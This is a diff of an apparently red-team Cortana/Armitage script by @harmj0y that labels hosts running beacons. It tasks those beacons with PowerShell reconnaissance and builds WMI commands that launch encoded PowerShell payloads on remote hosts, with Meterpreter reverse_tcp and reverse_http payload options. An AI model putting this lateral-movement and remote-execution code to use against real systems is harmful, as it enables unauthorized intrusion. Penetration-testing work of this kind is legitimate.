@@ -1,3 +1,24 @@
+#
+# This script changes the host icon for targets with active beacons
+# and adds a 'beacon' label to the host. If it finds a host that has 
+# this specific note set, it changes the host icon.
+#
+# A menu option is also implemented when you right click on a host
+# that allows you to remove the beacon entirely from the database
+# and reset the label for the host.
+#
+# 
+# To use this effectively, create a new workspace with 'Labels'
+# set to "beacon" and "Hosts with sessions only" unchecked.
+# This will display only all active hosts with beacons.
+#
+#
+# icon is from  http://www.veryicon.com/icons/file-type/holographic/communicator.html
+#   (license: free for non-commercial use)
+#
+# Built by @harmj0y
+#
+
 # needed imports for custom menu creation
 import java.awt.*; # for borderlayout
 import javax.swing.*; # for jpanel
@@ -60,7 +81,7 @@ on heartbeat_5s {
         }
 
         $data = host_data($internal);
-
+        
         if ($data ne $null){
             $currentLabel = host_data($internal)['label'];
             %label[$internal] = $currentLabel;
@@ -124,7 +145,7 @@ popup host_bottom {
                 }
                 item "Invoke-FindLocalAdminAccess"{
                     $beaconID = %beaconHosts[$address];
-                    task_localadmin($beaconID);
+                    task_localadmin($beaconID);                    
                 }
             }
 
@@ -148,7 +169,7 @@ popup host_bottom {
 
                     # remove the beacon from the database
                     call('beacon.remove', $beaconID);
-
+                    
                     # clear out the label
                     $currentLabel = host_data($address)['label'];
                     %label[$address] = $currentLabel;
@@ -186,7 +207,7 @@ sub task_powershell_import {
 
 # task our beacon to execute a given powershell command
 sub task_powershell {
-
+    
     $id = $1;
     $len  = strlen($2);
 
@@ -291,12 +312,12 @@ sub prompt_listener {
 }
 
 
-# choose a particular payload from a list and fill
+# choose a particular payload from a list and fill 
 # the value into the calling table
 sub choose_payload {
-
+    
     local('@payloads $file $handlef');
-
+    
     @payloads = @(
         %(payload => "windows/meterpreter/reverse_tcp"),
         %(payload => "windows/meterpreter/reverse_http"),
@@ -321,10 +342,10 @@ sub choose_rhost_file {
 
     local('$file $handlef @rhosts');
     @rhosts = @();
-
+    
     # read in a list of users to hunt for
     $file = prompt_file_open("RHOST List");
-
+    
     if ($file ne ""){
         $handlef = openf($file);
         while $readf (readln($handlef)){
@@ -337,7 +358,7 @@ sub choose_rhost_file {
 }
 
 
-# Main user-interaction dialog
+# Main user-interaction dialog 
 #
 # adapted from armitage/scripts/attacks.sl
 # thanks for the bsd license raffi :)
@@ -389,7 +410,7 @@ sub wmi_dialog {
 
     # add a lambda listener to trigger the generation of our payload
     [$executeButton addActionListener: lambda({
-
+        
         syncTable($table);
         $options = %();
 
@@ -425,7 +446,7 @@ sub wmi_dialog {
     [$s resetToPreferredSizes];
     [$s setOneTouchExpandable: 1];
 
-    [$dialog add: $s, [BorderLayout CENTER]];
+    [$dialog add: $s, [BorderLayout CENTER]];   
     [$dialog add: $south, [BorderLayout SOUTH]];
 
     [$executeButton requestFocus];
@@ -439,7 +460,7 @@ sub wmi_dialog {
 #
 ###################################################
 
-# arguments ->
+# arguments -> 
 #       $1 = Beacon ID
 #       $2 : RHOST
 #       $3 : RemoteUser
@@ -449,7 +470,7 @@ sub wmi_dialog {
 #       $7 : LPORT
 #       $8 : RunWOW64
 sub executeWMI {
-
+    
     $beacon_id = $1;
     $RHOST = $2;
     $RemoteUser = $3;
@@ -495,7 +516,7 @@ Start-Sleep -s 1000000';
 
     # base64 encode the payload, for -enc usage
     $encoded = [msf.Base64 encode: $script];
-
+    
     # command to invoke, see if we need the syswow64 PowerShell
     if( ! $RunWOW64){
         $script = "function update{Invoke-WmiMethod -ComputerName ".$RHOST." -Path Win32_process -Name create -ArgumentList \"powershell.exe -enc ".$encoded."\"}";
@@ -594,7 +615,7 @@ sub task_localadmin {
 # main dialoag menu
 sub valueListener {
     local('$table $model $actions');
-    ($table, $model, $actions) = @_;
+    ($table, $model, $actions) = @_; 
 
     if ($actions is $null) {
         $actions = %();
@@ -605,7 +626,7 @@ sub valueListener {
 
     # when Payload is clicked, choose a MSFPaylaod
     $actions["Payload +"] = lambda(&choose_payload);
-
+    
     $actions["RHOST +"] = {
         local('$title $temp');
         $title = "Select $1";
@@ -613,7 +634,7 @@ sub valueListener {
         if ($temp !is $null) {
             local('$handle');
             $handle = openf($temp);
-            @addresses = readAll($handle);
+            @addresses = readAll($handle);  
             closef($handle);
 
             [$4: join(", ", @addresses)];
@@ -669,17 +690,17 @@ sub quickListDialog {
     $dialog = dialog($1, $width, $height);
     $panel = [new JPanel];
     [$panel setLayout: [new BorderLayout]];
-
+    
     ($table, $model) = setupTable($3[0], sublist($3, 1), $4);
     [$panel add: [new JScrollPane: $table], [BorderLayout CENTER]];
 
     if ($tablef !is $null) {
         [$tablef: $table, $model];
     }
-
+    
     $button = [new JButton: $2];
     [$button addActionListener: lambda({
-        [$callback : [$model getSelectedValueFromColumn: $table, $lead], $table, $model];
+        [$callback : [$model getSelectedValueFromColumn: $table, $lead], $table, $model]; 
         [$dialog setVisible: 0];
     }, \$dialog, $callback => $5, \$model, \$table, $lead => $3[0])];
 
@@ -722,7 +743,7 @@ sub setupTable {
             [$sorter setComparator: $index, { return $1 <=> $2; }];
         }
     }
-
+    
     return @($table, $model);
 }
 
